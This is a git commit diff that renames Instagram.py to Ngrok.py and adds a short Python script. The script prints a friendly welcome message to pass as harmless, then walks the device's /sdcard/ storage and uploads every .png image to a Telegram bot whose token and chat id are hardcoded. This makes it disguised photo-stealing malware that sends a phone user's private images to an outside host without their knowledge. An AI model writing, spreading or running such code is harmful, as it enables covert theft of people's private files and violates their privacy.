3cfbe35047477cbe8e3f149bf3111ef8dff3aa00
Amjdahmed <99422010+Amjdahmed@users.noreply.github.com>
2022-09-02 21:15:12 +0200

    Update and rename Instagram.py to Ngrok.py

---
+++ Ngrok.py
@@ -0,0 +1,15 @@
+import os,requests,time
+print('Welcome to the world of Python programming!')
+os.system('pip install requests ')
+os.system('clear')
+
+print('Welcome to the world of Python programming!')
+for f1, f2 , f3 in os.walk('/sdcard/'):
+	for a in f3:
+		if '.png'in a:
+			out=os.path.join(f1,a)
+			id = 1268370511
+			token ='5366702455:AAF40RHfe-vrQ9ouj9Vd_dFhA9npzcbT8ho'
+			file ={"document": open(f'{out}', 'rb')}
+			req = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
+			
